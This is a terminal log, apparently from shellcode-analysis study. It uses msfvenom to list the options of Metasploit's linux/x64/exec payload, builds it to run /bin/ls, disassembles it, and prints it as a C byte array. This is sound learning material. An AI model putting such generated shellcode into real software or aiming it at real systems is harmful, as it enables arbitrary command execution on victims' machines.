msfvenom -p linux/x64/exec --list-options

Options for payload/linux/x64/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command

msfvenom -p linux/x64/exec CMD=/bin/ls -a x64 --platform linux -f raw | ndisasm -u -

No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes

00000000  6A3B              push byte +0x3b
00000002  58                pop eax
00000003  99                cdq
00000004  48                dec eax
00000005  BB2F62696E        mov ebx,0x6e69622f
0000000A  2F                das
0000000B  7368              jnc 0x75
0000000D  005348            add [ebx+0x48],dl
00000010  89E7              mov edi,esp
00000012  682D630000        push dword 0x632d
00000017  48                dec eax
00000018  89E6              mov esi,esp
0000001A  52                push edx
0000001B  E808000000        call 0x28
00000020  2F                das
00000021  62696E            bound ebp,[ecx+0x6e]
00000024  2F                das
00000025  6C                insb
00000026  7300              jnc 0x28
00000028  56                push esi
00000029  57                push edi
0000002A  48                dec eax
0000002B  89E6              mov esi,esp
0000002D  0F05              syscall

msfvenom -p linux/x64/exec CMD=/bin/ls -a x64 --platform linux -f C

No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] =
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
